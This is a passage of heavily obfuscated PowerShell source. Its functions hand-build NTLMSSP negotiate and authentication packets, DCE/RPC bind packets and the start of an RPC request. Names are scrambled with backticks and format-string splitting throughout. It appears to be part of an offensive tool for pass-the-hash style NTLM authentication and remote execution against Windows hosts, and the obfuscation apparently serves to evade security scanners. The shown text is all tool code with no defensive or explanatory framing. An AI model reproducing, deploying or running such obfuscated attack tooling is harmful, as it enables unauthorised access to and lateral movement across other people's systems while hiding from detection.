        ${p`ACK`ET_NtLmssPNEgot`ia`TE}.("{1}{0}"-f 'dd','A').Invoke(("{1}{3}{7}{0}{5}{2}{4}{6}"-f 'egotiate_I','N','nerContextTok','TLMS','enLen','n','gth','SPN'),${PAc`Ket_`AsN_`LeNGTh_2})
        ${p`AcKE`T_NTLM`sSPnEGOti`ATe}.("{1}{0}"-f 'dd','A').Invoke(("{6}{0}{10}{2}{4}{11}{5}{9}{1}{3}{7}{8}" -f'TLMSSPNe','o','t','k','i','e_Inne','N','enI','D2','rContextT','go','at'),[Byte[]](0x30))
        ${P`Ac`KET_`NT`lM`SS`pnEgOtIa`Te}.("{0}{1}"-f'Ad','d').Invoke(("{1}{4}{2}{3}{5}{0}{6}{7}"-f'kenLeng','NTL','SSPNegot','iate_Inne','M','rContextTo','th','2'),${paCKe`T`_AsN_`lengtH_3})
        ${paCk`e`T`_ntLmSspn`EgOT`I`ATE}.("{0}{1}" -f 'Ad','d').Invoke(("{1}{3}{2}{4}{0}" -f'chTypesID','NT','SSPNego','LM','tiate_Me'),[Byte[]](0xa0))
        ${PAC`KEt_n`T`L`MsspNe`g`oTIA`Te}.("{1}{0}" -f'dd','A').Invoke(("{1}{4}{0}{3}{6}{5}{2}" -f 'Nego','N','gth','tiate_','TLMSSP','hTypesLen','Mec'),[Byte[]](0x0e))
        ${PAc`keT_nT`LMS`SP`NEG`Ot`iaTe}.("{0}{1}" -f'A','dd').Invoke(("{1}{5}{6}{3}{4}{7}{0}{2}"-f'T','NTL','ypesID2','e_','Me','MSSPNeg','otiat','ch'),[Byte[]](0x30))
        ${p`AcKET_nTLMs`SPnEgo`TI`ATE}.("{1}{0}" -f 'dd','A').Invoke(("{1}{0}{7}{4}{9}{6}{5}{8}{2}{3}" -f 'TLMSS','N','ngth','2','e','p','y','PNegotiate_M','esLe','chT'),[Byte[]](0x0c))
        ${PAcK`et_ntlms`SPne`Go`T`iAtE}.("{1}{0}" -f'dd','A').Invoke(("{4}{3}{0}{5}{2}{1}{6}" -f'P','ID','chTypes','TLMSS','N','Negotiate_Me','3'),[Byte[]](0x06))
        ${PACkEt_N`TLMS`Sp`NegOTI`A`Te}.("{1}{0}" -f'd','Ad').Invoke(("{7}{4}{2}{6}{5}{1}{0}{3}" -f'e','hTypesL','SSPNe','ngth3','LM','tiate_Mec','go','NT'),[Byte[]](0x0a))
        ${P`AcKET_nTlMs`SPNE`G`o`Tia`TE}.("{0}{1}"-f'A','dd').Invoke(("{0}{2}{1}{4}{3}"-f'NTLMSSP','otiate_Mech','Neg','ype','T'),[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
        ${p`AC`kET`_NT`LMSSPNE`gO`TiA`Te}.("{0}{1}" -f 'Ad','d').Invoke(("{4}{0}{5}{3}{1}{2}"-f'PNe','TokenI','D','Mech','NTLMSS','gotiate_'),[Byte[]](0xa2))
        ${p`ACK`e`T_ntL`msS`p`NEGOtiA`TE}.("{0}{1}"-f 'A','dd').Invoke(("{1}{3}{5}{2}{4}{0}{6}" -f 'L','NTL','hToke','MSSPNe','n','gotiate_Mec','ength'),${PaCkeT`_A`SN_L`eN`G`T`h_4})
        ${pacK`E`T_n`TL`mS`S`pneG`otiATE}.("{1}{0}"-f'dd','A').Invoke(("{2}{6}{3}{0}{5}{7}{4}{1}"-f'ego','LMSSPID','NTLMSS','N','_NT','ti','P','ate'),[Byte[]](0x04))
        ${pA`CK`eT`_N`TLMss`pneG`ot`IATe}.("{1}{0}"-f'dd','A').Invoke(("{3}{2}{5}{6}{7}{1}{8}{0}{4}"-f 'ng','TLMSSP','TLMSS','N','th','PNegotia','t','e_N','Le'),${PAc`KEt_N`TlmS`sp_`l`en`GtH})
        ${Pa`cK`E`T_`NtlmSs`Pn`egoTiATE}.("{1}{0}" -f 'd','Ad').Invoke(("{2}{1}{5}{8}{4}{3}{7}{6}{0}" -f 'ntifier','P','NTLMSS','e_','at','Neg','de','I','oti'),[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        ${PaCK`Et_nt`l`msSpN`EgoTiaTE}.("{0}{1}" -f'A','dd').Invoke(("{3}{4}{5}{6}{0}{1}{7}{8}{2}"-f 'ssag','e','pe','N','TLM','SSPNegoti','ate_Me','T','y'),[Byte[]](0x01,0x00,0x00,0x00))
        ${P`Ac`KET`_NTlMs`sPNEGOtiA`Te}.("{1}{0}"-f'd','Ad').Invoke(("{1}{6}{0}{4}{2}{5}{3}" -f 'go','NTLMS','e_Nego','iateFlags','tiat','t','SPNe'),${pa`Cket`_`NeGOt`iaTe_fLaGS})
        ${pAcKE`T_`NtLMS`Sp`NeGo`TiATE}.("{0}{1}"-f'Ad','d').Invoke(("{3}{10}{0}{8}{4}{1}{6}{2}{7}{5}{9}{11}" -f'SP','iate_','allingWo','N','t','onD','C','rkstati','Nego','omai','TLMS','n'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${pAC`KET`_nTLmSSpn`e`Gotia`TE}.("{0}{1}" -f'Ad','d').Invoke(("{3}{8}{0}{5}{7}{1}{4}{6}{2}"-f 'go','Workst','nName','NTLMSSP','ati','tiate_','o','Calling','Ne'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        if(${pAc`KET_veR`s`i`on})
        {
            ${P`A`Cket`_N`TL`mS`SPNegotiaTe}.("{0}{1}"-f'Ad','d').Invoke(("{1}{3}{4}{0}{2}"-f 'Ver','NTL','sion','MSSPNegot','iate_'),${PaCK`Et_`VER`sion})
        }

        return ${pA`cKET`_n`Tlm`sSP`NEgotIa`TE}
    }

    function gEt-pa`cKeTNTLm`Ss`pA`UTh()
    {
        param([Byte[]]${PA`CKeT_N`Tl`m_ReSP`oNse})

        [Byte[]]${P`A`Cke`T_NtlMssp_LE`NGTH} =   ( &("{0}{1}" -f 'g','cI')  ('V'+'arIA'+'blE:'+'W'+'2ehX') )."vAL`Ue"::("{1}{2}{0}" -f'tes','G','etBy').Invoke(${PACK`e`T_NT`LM_r`eSPON`se}."l`ENGTh")
        ${paCK`Et_NT`LM`ssP_LEN`gTH} = ${PaCkE`T`_nTlMSsP_`LEnG`TH}[1,0]
        [Byte[]]${P`A`CkEt_`Asn`_LeNGT`H_1} =   (&("{0}{3}{1}{2}"-f'GET-','RiaBl','e','Va') W2eHx  )."vAl`UE"::("{0}{1}" -f 'G','etBytes').Invoke(${pa`CK`ET_n`TLM_respO`Nse}."LeNG`Th" + 12)
        ${Pa`c`KEt_`AsN_LEn`gt`H`_1} = ${paCK`E`T`_AsN_Le`N`GTh_1}[1,0]
        [Byte[]]${PA`C`ke`T`_aSn_lENgt`H_2} =   (  &("{1}{0}"-f 'IR','D') ('VArIAb'+'lE:W'+'2E'+'h'+'X'))."vAl`Ue"::("{1}{2}{0}"-f 'tes','Get','By').Invoke(${Pa`cKEt_`N`Tlm_res`p`OnSE}."lEN`Gth" + 8)
        ${pa`CKet_`Asn_l`eNgTH_2} = ${PA`cKet`_aSN`_L`EnGth_2}[1,0]
        [Byte[]]${PAc`Ket`_`Asn`_LeNg`TH`_3} =  (  &('Ls')  vARiABLE:w2EHx )."va`lue"::("{0}{2}{1}" -f 'Ge','tes','tBy').Invoke(${PA`CkeT`_Nt`LM_R`EsPOnsE}."L`E`NgTh" + 4)
        ${pA`CKET`_`As`N_LEng`TH_3} = ${paCk`e`T_`Asn`_le`NG`Th_3}[1,0]

        ${pACKE`T_NtLm`SsP`AuTH} = &("{0}{2}{1}" -f'Ne','Object','w-') ("{2}{0}{3}{4}{11}{7}{12}{6}{8}{5}{14}{10}{13}{1}{9}" -f 'stem.Collectio','iona','Sy','ns.Sp','eci','d','e','l','d.Or','ry','redDi','a','iz','ct','e')
        ${pAcK`et_N`TLMss`Pa`U`Th}.("{1}{0}" -f'dd','A').Invoke(("{4}{0}{2}{3}{1}{5}"-f 'MSS','I','P','Auth_ASN','NTL','D'),[Byte[]](0xa1,0x82))
        ${PaCKE`T_nt`l`M`SspAuth}.("{1}{0}" -f'dd','A').Invoke(("{3}{4}{0}{1}{2}"-f 'Auth_ASN','Len','gth','N','TLMSSP'),${Pac`ke`T_AsN_`l`en`gth_1})
        ${p`ACkET`_n`TLMss`PAUTh}.("{0}{1}"-f'Ad','d').Invoke(("{1}{2}{0}{3}"-f 'h_A','NTLMSSPAu','t','SNID2'),[Byte[]](0x30,0x82))
        ${pa`CkEt_NT`LMsSPAu`Th}.("{1}{0}"-f'd','Ad').Invoke(("{4}{0}{2}{1}{3}"-f 'LMSSPAut','Len','h_ASN','gth2','NT'),${pA`ck`Et`_`AsN_LeNGT`H_2})
        ${P`AC`kEt_`NTLmsSpAutH}.("{0}{1}"-f 'A','dd').Invoke(("{2}{1}{3}{4}{0}" -f 'NID3','SP','NTLMS','Auth_','AS'),[Byte[]](0xa2,0x82))
        ${p`ACKET_ntlMSs`PA`U`Th}.("{0}{1}"-f 'A','dd').Invoke(("{0}{3}{4}{2}{1}" -f 'NTLMSSPA','h3','t','u','th_ASNLeng'),${P`ACk`eT`_aSn_Len`Gth_3})
        ${p`A`CKE`T_nTLmss`PAuTH}.("{1}{0}"-f'dd','A').Invoke(("{0}{2}{1}{3}" -f 'NTLMSS','SPI','PAuth_NTLMS','D'),[Byte[]](0x04,0x82))
        ${P`ACkEt_`Nt`l`MSspau`Th}.("{1}{0}" -f'dd','A').Invoke(("{2}{1}{0}{4}{3}"-f 'Auth_NTL','TLMSSP','N','h','MSSPLengt'),${PACk`e`T_`NtlmSsp_LeNG`Th})
        ${P`AC`keT`_N`TlmSspAutH}.("{0}{1}" -f'Ad','d').Invoke(("{6}{4}{3}{5}{1}{2}{7}{0}" -f 'e','h_NTL','MResp','PA','MSS','ut','NTL','ons'),${P`ACkEt_NT`L`M_rESPOn`se})

        return ${P`AcKE`T_NtLmSS`p`A`UTh}
    }

    

    function GeT-PAc`k`eTR`PcBI`ND()
    {
        param([Int]${pA`c`kE`T_calL_Id},[Byte[]]${p`Ack`ET_mAx`_fr`Ag},[Byte[]]${pAc`kE`T_`NuM_CT`X_ITems},[Byte[]]${p`AcKeT_`Con`Te`xT_id},[Byte[]]${p`ACK`ET`_uUid},[Byte[]]${pAcket`_`UU`id`_`VERSi`On})

        [Byte[]]${p`Ac`kE`T_call_Id_b`yT`Es} =  ${W`2EHx}::("{0}{2}{1}"-f 'GetB','tes','y').Invoke(${pAc`keT`_C`All_iD})

        ${PaCKEt_R`p`Cb`iNd} = &("{2}{1}{3}{0}" -f'ect','w-Ob','Ne','j') ("{0}{6}{9}{8}{11}{1}{2}{10}{7}{5}{4}{12}{3}"-f 'Sy','zed.O','rd','ry','o','i','stem','dDict','p','.Collections.S','ere','eciali','na')
        ${PaCK`Et_r`p`c`Bind}.("{0}{1}"-f 'A','dd').Invoke(("{3}{1}{0}{2}"-f 'io','ers','n','RPCBind_V'),[Byte[]](0x05))
        ${P`A`CkeT`_rpcB`ind}.("{0}{1}"-f'A','dd').Invoke(("{2}{3}{1}{0}{4}" -f 'i','VersionM','R','PCBind_','nor'),[Byte[]](0x00))
        ${pAcKet`_RPc`B`I`Nd}.("{1}{0}"-f 'dd','A').Invoke(("{1}{2}{3}{4}{0}" -f'Type','RPCBi','nd_Pac','k','et'),[Byte[]](0x0b))
        ${Pa`C`kEt_`RPcBINd}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{1}{2}{4}{3}" -f 'RPCBin','d_Pac','k','ags','etFl'),[Byte[]](0x03))
        ${P`ACkEt_rpc`B`INd}.("{0}{1}"-f'Ad','d').Invoke(("{4}{3}{1}{0}{5}{2}{6}" -f'd','n','aRepres','i','RPCB','_Dat','entation'),[Byte[]](0x10,0x00,0x00,0x00))
        ${pac`kE`T_RP`cbi`Nd}.("{0}{1}" -f 'A','dd').Invoke(("{5}{2}{1}{3}{4}{0}" -f 'h','FragLe','PCBind_','n','gt','R'),[Byte[]](0x48,0x00))
        ${Pa`CkeT_`Rp`CB`Ind}.("{0}{1}"-f'A','dd').Invoke(("{2}{0}{1}{4}{3}" -f 'CBi','nd_Au','RP','th','thLeng'),[Byte[]](0x00,0x00))
        ${Pa`Ck`et`_RpcBI`ND}.("{1}{0}"-f'd','Ad').Invoke(("{2}{1}{3}{0}"-f 'ID','_C','RPCBind','all'),${PAc`kET`_caLL`_`i`D_BYteS})
        ${PAcKEt_`RP`Cb`IND}.("{1}{0}" -f 'd','Ad').Invoke(("{2}{1}{0}{3}" -f'Bind_MaxXmit','PC','R','Frag'),[Byte[]](0xb8,0x10))
        ${pa`ck`et_Rp`cb`INd}.("{0}{1}" -f'A','dd').Invoke(("{0}{3}{2}{1}" -f 'R','vFrag','CBind_MaxRec','P'),[Byte[]](0xb8,0x10))
        ${p`Ac`k`ET_RpcBInd}.("{1}{0}"-f'd','Ad').Invoke(("{1}{2}{3}{0}"-f 'p','RPCBind_AssocGr','o','u'),[Byte[]](0x00,0x00,0x00,0x00))
        ${PACKeT`_RpC`BI`ND}.("{0}{1}"-f'Ad','d').Invoke(("{1}{3}{0}{2}{4}"-f'_Nu','RPCBin','mC','d','txItems'),${p`AcK`eT_NUm`_CTx_I`TEMS})
        ${Pa`C`KEt_rPcbiNd}.("{1}{0}"-f 'dd','A').Invoke(("{3}{1}{0}{2}" -f'_','Bind','Unknown','RPC'),[Byte[]](0x00,0x00,0x00))
        ${P`AcKE`T_rpc`BiNd}.("{1}{0}"-f 'dd','A').Invoke(("{3}{2}{0}{1}" -f'tI','D','Contex','RPCBind_'),${p`A`ckET_CoN`TEx`T_ID})
        ${P`ACk`E`T_rPcBInd}.("{0}{1}" -f 'A','dd').Invoke(("{0}{2}{5}{3}{1}{4}"-f 'RPCBind_','I','Nu','ns','tems','mTra'),[Byte[]](0x01))
        ${PA`CKeT_rPcB`i`ND}.("{0}{1}" -f'Ad','d').Invoke(("{0}{1}{3}{2}"-f'RPC','Bi','nknown2','nd_U'),[Byte[]](0x00))
        ${Pac`kET`_rPC`BInd}.("{0}{1}"-f'A','dd').Invoke(("{3}{2}{1}{0}"-f'rface','Inte','d_','RPCBin'),${pa`CKET`_U`UiD})
        ${pac`KeT`_`RPcbI`ND}.("{0}{1}"-f'A','dd').Invoke(("{2}{1}{0}{4}{3}" -f'er','_Int','RPCBind','aceVer','f'),${p`AcKET_uui`d_`Ver`SI`ON})
        ${pacK`Et_R`PCB`iNd}.("{0}{1}" -f'Ad','d').Invoke(("{2}{3}{1}{0}{4}" -f 'VerM','e','RPCBind_Inte','rfac','inor'),[Byte[]](0x00,0x00))
        ${Pa`c`KE`T_RP`cBiNd}.("{1}{0}" -f 'd','Ad').Invoke(("{1}{2}{0}{3}{4}"-f'sf','RPCBind_T','ran','er','Syntax'),[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
        ${pAc`ket_`RPcbINd}.("{0}{1}"-f'Ad','d').Invoke(("{0}{5}{4}{2}{3}{1}"-f 'RPC','xVer','t','a','Syn','Bind_Transfer'),[Byte[]](0x02,0x00,0x00,0x00))

        if(${pACk`et_Num_c`Tx_It`EMs}[0] -eq 2)
        {
            ${PAc`k`ET_RpCB`inD}.("{1}{0}"-f'dd','A').Invoke(("{3}{2}{4}{0}{5}{1}"-f'Contex','2','P','R','CBind_','tID'),[Byte[]](0x01,0x00))
            ${p`A`cKEt`_`RpCBInd}.("{0}{1}"-f 'A','dd').Invoke(("{3}{0}{2}{1}{4}" -f'C','ind_','B','RP','NumTransItems2'),[Byte[]](0x01))
            ${pac`KEt_RpCbi`ND}.("{0}{1}"-f'Ad','d').Invoke(("{4}{0}{3}{2}{1}"-f 'CBi','_Unknown3','d','n','RP'),[Byte[]](0x00))
            ${PAckE`T_`RPcB`ind}.("{0}{1}"-f'Ad','d').Invoke(("{4}{0}{2}{3}{1}"-f'PC','face2','Bind','_Inter','R'),[Byte[]](0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a))
            ${P`AC`kE`T_rP`cBiNd}.("{0}{1}"-f 'A','dd').Invoke(("{3}{1}{4}{2}{0}"-f'r2','PCBind_','nterfaceVe','R','I'),[Byte[]](0x00,0x00))
            ${PAckE`T_Rp`CBi`Nd}.("{1}{0}"-f 'd','Ad').Invoke(("{4}{3}{1}{6}{0}{2}{5}" -f 'Ve','fac','rMin','nter','RPCBind_I','or2','e'),[Byte[]](0x00,0x00))
            ${PacKET_rpc`B`iND}.("{0}{1}" -f'Ad','d').Invoke(("{0}{5}{4}{3}{2}{1}" -f 'RPCB','yntax2','erS','sf','ran','ind_T'),[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            ${PAcKE`T`_R`P`CbIND}.("{0}{1}"-f 'Ad','d').Invoke(("{0}{1}{2}{3}{4}" -f 'RPCBind','_T','ransferS','ynta','xVer2'),[Byte[]](0x01,0x00,0x00,0x00))
        }
        elseif(${PacKe`T_nuM_C`TX_iTE`Ms}[0] -eq 3)
        {
            ${pa`Cket_`R`pCbInd}.("{1}{0}"-f'dd','A').Invoke(("{1}{0}{5}{3}{4}{2}"-f'in','RPCB','ID2','_Conte','xt','d'),[Byte[]](0x01,0x00))
            ${PaC`keT_rP`c`B`inD}.("{1}{0}" -f'd','Ad').Invoke(("{2}{5}{0}{3}{4}{1}" -f'T','2','RPCBi','ransI','tems','nd_Num'),[Byte[]](0x01))
            ${P`AcKET_`RpcbIND}.("{0}{1}" -f'Ad','d').Invoke(("{2}{3}{1}{0}{4}"-f 'n','_U','RP','CBind','known3'),[Byte[]](0x00))
            ${pa`Cke`T_`Rpc`BiND}.("{0}{1}"-f 'Ad','d').Invoke(("{5}{1}{2}{4}{0}{3}"-f 'd_Interface','CB','i','2','n','RP'),[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
            ${PAc`K`Et`_RpcBI`ND}.("{1}{0}" -f 'dd','A').Invoke(("{3}{0}{4}{1}{2}"-f 'ind','Inte','rfaceVer2','RPCB','_'),[Byte[]](0x00,0x00))
            ${PAc`k`et_rP`cB`iND}.("{1}{0}" -f'd','Ad').Invoke(("{3}{1}{0}{4}{2}{5}"-f 'nd_','Bi','rMino','RPC','InterfaceVe','r2'),[Byte[]](0x00,0x00))
            ${packe`T`_R`PcBind}.("{1}{0}"-f 'd','Ad').Invoke(("{1}{3}{4}{0}{2}" -f'ynta','RPCBi','x2','nd_Tran','sferS'),[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
            ${p`ACKe`T`_rPcbi`Nd}.("{1}{0}" -f 'dd','A').Invoke(("{1}{4}{3}{0}{2}" -f'r','RPCBind_TransferS','2','ntaxVe','y'),[Byte[]](0x01,0x00,0x00,0x00))
            ${paCKeT_R`pC`BI`Nd}.("{0}{1}"-f 'A','dd').Invoke(("{3}{2}{1}{0}{5}{4}"-f'n','ind_Co','CB','RP','extID3','t'),[Byte[]](0x02,0x00))
            ${pA`c`ket`_rPcBINd}.("{0}{1}"-f 'Ad','d').Invoke(("{6}{1}{4}{2}{5}{3}{0}" -f'3','PCBi','NumTr','nsItems','nd_','a','R'),[Byte[]](0x01))
            ${PaC`Ke`T`_rPC`BInD}.("{1}{0}"-f 'dd','A').Invoke(("{3}{2}{0}{1}" -f 'd_Unkno','wn4','PCBin','R'),[Byte[]](0x00))
            ${PacKET_`RPc`BiNd}.("{1}{0}" -f'dd','A').Invoke(("{1}{0}{2}{4}{3}"-f'PCBind','R','_I','e3','nterfac'),[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
            ${p`AcKEt_RP`cbI`ND}.("{1}{0}"-f 'dd','A').Invoke(("{0}{3}{1}{4}{2}" -f'RPCBin','erf','3','d_Int','aceVer'),[Byte[]](0x00,0x00))
            ${P`A`CKEt_`R`pcbInd}.("{0}{1}" -f'A','dd').Invoke(("{1}{2}{4}{0}{3}"-f'Mi','RPCBind','_Interfa','nor3','ceVer'),[Byte[]](0x00,0x00))
            ${PAC`Ke`T_R`pcBInd}.("{0}{1}" -f 'Ad','d').Invoke(("{0}{3}{2}{6}{1}{4}{5}" -f 'R','nt','Bind_T','PC','a','x3','ransferSy'),[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            ${PaC`kE`T`_rp`CBIND}.("{1}{0}" -f'dd','A').Invoke(("{2}{4}{1}{0}{3}{6}{5}{7}"-f 'ind_T','CB','R','ran','P','S','sfer','yntaxVer3'),[Byte[]](0x01,0x00,0x00,0x00))
            ${pACKeT`_r`pCb`InD}.("{1}{0}"-f'dd','A').Invoke(("{3}{1}{2}{0}"-f'e','d_AuthT','yp','RPCBin'),[Byte[]](0x0a))
            ${Pac`K`E`T_`RPcBinD}.("{0}{1}"-f 'A','dd').Invoke(("{0}{3}{1}{2}"-f 'RPC','ind_Au','thLevel','B'),[Byte[]](0x04))
            ${PA`cK`eT`_rPcbIND}.("{0}{1}" -f'A','dd').Invoke(("{0}{3}{4}{1}{2}" -f 'RPC','g','th','Bind_AuthPadL','en'),[Byte[]](0x00))
            ${pA`ck`e`T_rpCBInd}.("{0}{1}" -f'A','dd').Invoke(("{1}{0}{5}{3}{4}{2}"-f'Bi','RPC','ed','AuthRe','serv','nd_'),[Byte[]](0x00))
            ${PaC`ke`T_r`pc`BIND}.("{1}{0}" -f 'd','Ad').Invoke(("{1}{3}{2}{0}" -f 'extID4','RPCB','_Cont','ind'),[Byte[]](0x00,0x00,0x00,0x00))
            ${pACKE`T_`RPC`BI`Nd}.("{0}{1}"-f'Ad','d').Invoke(("{0}{1}{4}{2}{3}"-f'R','PCBind','ie','r','_Identif'),[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
            ${PaCKEt`_`R`PC`BIND}.("{1}{0}"-f'd','Ad').Invoke(("{1}{3}{2}{5}{4}{0}{6}"-f'y','R','Me','PCBind_','T','ssage','pe'),[Byte[]](0x01,0x00,0x00,0x00))
            ${Pa`CkeT`_RPcbINd}.("{1}{0}" -f 'dd','A').Invoke(("{2}{3}{0}{1}"-f'd_Neg','otiateFlags','R','PCBin'),[Byte[]](0x97,0x82,0x08,0xe2))
            ${PaCK`e`T_rP`Cb`INd}.("{0}{1}" -f 'A','dd').Invoke(("{9}{7}{0}{3}{5}{1}{6}{8}{2}{4}"-f'ind_','lingWo','stationDom','Ca','ain','l','r','PCB','k','R'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            ${PacKet`_rpc`B`Ind}.("{1}{0}" -f'dd','A').Invoke(("{3}{2}{0}{6}{1}{8}{5}{7}{4}" -f'li','Works','Bind_Cal','RPC','Name','at','ng','ion','t'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            ${p`A`cKE`T_rP`cbind}.("{1}{0}"-f'dd','A').Invoke(("{4}{2}{3}{5}{0}{1}"-f 'OS','Version','PCB','in','R','d_'),[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
        }

        if(${p`ACket_cal`l_Id} -eq 3)
        {
            ${PaCKe`T_R`pCbi`Nd}.("{1}{0}"-f 'dd','A').Invoke(("{1}{4}{3}{2}{0}"-f 'pe','R','_AuthTy','Bind','PC'),[Byte[]](0x0a))
            ${pa`ck`eT_`RpCBiND}.("{1}{0}" -f'd','Ad').Invoke(("{4}{1}{3}{0}{2}" -f'AuthLeve','CB','l','ind_','RP'),[Byte[]](0x02))
            ${P`AC`kET_`RP`CBIND}.("{0}{1}" -f'A','dd').Invoke(("{6}{1}{0}{5}{2}{3}{4}"-f 't','_Au','PadL','eng','th','h','RPCBind'),[Byte[]](0x00))
            ${pAcke`T`_R`pc`BiNd}.("{1}{0}" -f'd','Ad').Invoke(("{3}{1}{0}{4}{2}" -f 'nd','PCBi','hReserved','R','_Aut'),[Byte[]](0x00))
            ${P`Ack`et_r`pc`Bind}.("{0}{1}" -f'A','dd').Invoke(("{2}{4}{0}{3}{1}" -f 'd_','ntextID3','R','Co','PCBin'),[Byte[]](0x00,0x00,0x00,0x00))
            ${PA`CKE`T_Rp`cbInD}.("{0}{1}" -f'A','dd').Invoke(("{4}{2}{1}{0}{3}"-f 'n','CBind_Ide','P','tifier','R'),[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
            ${PA`CKeT_`RpcB`iND}.("{0}{1}"-f 'A','dd').Invoke(("{3}{2}{1}{0}{5}{4}" -f'es','nd_M','Bi','RPC','pe','sageTy'),[Byte[]](0x01,0x00,0x00,0x00))
            ${Pa`c`Ke`T_`RPcbInd}.("{0}{1}" -f 'Ad','d').Invoke(("{2}{4}{3}{1}{5}{0}" -f'gs','otiate','RPCBi','Neg','nd_','Fla'),[Byte[]](0x97,0x82,0x08,0xe2))
            ${P`A`cket_RpcB`I`Nd}.("{1}{0}"-f 'd','Ad').Invoke(("{4}{3}{5}{1}{2}{0}" -f'tionDomain','li','ngWorksta','Bind_Ca','RPC','l'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            ${pAc`kET`_R`PCbinD}.("{0}{1}" -f 'Ad','d').Invoke(("{1}{8}{6}{7}{2}{4}{0}{5}{3}"-f'ta','RPCBind','ing','e','Works','tionNam','Ca','ll','_'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            ${PACkE`T`_R`P`Cbind}.("{0}{1}" -f 'Ad','d').Invoke(("{0}{1}{2}{3}"-f'RPCBind','_O','SVe','rsion'),[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
        }

        return ${Pack`ET_R`p`CB`iND}
    }

    function G`ET-PAc`KETRpCrEq`UEst()
    {
        param([Byte[]]${pAC`kE`T_fl`AGs},[Int]${p`A`C`KEt_sErVIC`E_LEngTH},[Int]${pAck`et_aU`TH_`LE`N`Gth},[Int]${p`ACKET_au`Th`_P`ADDINg},[Byte[]]${P`A`ckE`T_`call_ID},[Byte[]]${p`A`cKet_`Co`NtEXt_id},[Byte[]]${pACKEt_O`pN`UM},[Byte[]]${PAcKE`T_DA`TA})

        if(${paCket_`A`U`TH`_LEn`GTH} -gt 0)
        {
            ${pacKeT_FULL_`AU`TH`_lE`NG`TH} = ${P`AcK`E`T`_AUTH_le`NGtH} + ${p`Ack`E`T_AutH`_`PAdDinG} + 8
        }

        [Byte[]]${PACK`eT_`wri`T`e_LENgth} =   ${w`2EHX}::("{2}{0}{1}" -f 'B','ytes','Get').Invoke(${pAcket_S`er`VIc`E_LENGth} + 24 + ${PA`ckeT_ful`L`_`A`UtH_LeN`GTH} + ${P`ACket`_DAta}."LEN`GTH")
        [Byte[]]${pacK`ET_F`Rag_L`e`NgtH} = ${paCKeT`_`w`RItE`_lEnGTh}[0,1]
        [Byte[]]${pAcKE`T`_aLL`oC`_HiNT} =  ( &("{0}{1}" -f'g','cI')  ("VaRia"+"b"+"le:w"+"2eH"+"x"))."Val`UE"::("{0}{1}{2}" -f'Get','By','tes').Invoke(${Pa`Ck`eT_seRVice`_`l`EngTH} + ${pacK`eT`_DaTA}."leNg`TH")
        [Byte[]]${P`A`C`KET_aUtH_l`ength} =   ${W2E`hX}::("{2}{0}{1}"-f'tByt','es','Ge').Invoke(${paC`KE`T`_AUt`h_LE`NgtH})
        ${p`A`cK`et_AutH_le`Ngth} = ${pACket_AuTh_L`E`N`gtH}[0,1]

        ${pAC`kE`T_rp`cr`EqUEsT} = &("{2}{0}{1}" -f 'w','-Object','Ne') ("{7}{4}{1}{5}{6}{2}{0}{8}{3}{9}" -f'd.O','Colle','cialize','c','ystem.','cti','ons.Spe','S','rderedDi','tionary')
        ${p`ACkET_`Rpcre`QUeSt}.("{0}{1}" -f'Ad','d').Invoke(("{5}{1}{0}{2}{4}{3}" -f'es','Requ','t','sion','_Ver','RPC'),[Byte[]](0x05))
        ${pA`CkEt`_r`pCR`eqUEsT}.("{0}{1}"-f 'A','dd').Invoke(("{6}{0}{2}{1}{4}{3}{5}" -f'quest_','rsio','Ve','Mi','n','nor','RPCRe'),[Byte[]](0x00))
        ${paCKEt`_R`PCrEQue`sT}.("{1}{0}"-f'dd','A').Invoke(("{2}{0}{4}{1}{3}" -f 'Req','est_P','RPC','acketType','u'),[Byte[]](0x00))
        ${Pac`k`Et_r`pcRe`QU`est}.("{1}{0}" -f'dd','A').Invoke(("{0}{2}{3}{1}{4}{5}"-f 'RP','ket','CRequest','_Pac','Fl','ags'),${pACkeT_`F`Lags})
        ${PACKET`_`R`PcREqUEsT}.("{0}{1}"-f 'A','dd').Invoke(("{1}{4}{5}{0}{2}{3}"-f's','RPCRe','t_','DataRepresentation','qu','e'),[Byte[]](0x10,0x00,0x00,0x00))
        ${pA`CkET_rpcR`eQ`UEst}.("{0}{1}" -f'Ad','d').Invoke(("{2}{1}{5}{4}{0}{3}"-f'agL','CReq','RP','ength','_Fr','uest'),${pA`CKeT_`Fr`Ag_LENGtH})
        ${PAC`kEt_RpCR`EQU`eSt}.("{1}{0}" -f 'd','Ad').Invoke(("{0}{4}{5}{3}{2}{1}"-f'RPCR','thLength','u','A','equest','_'),${P`ACket_aUTh`_leNg`TH})
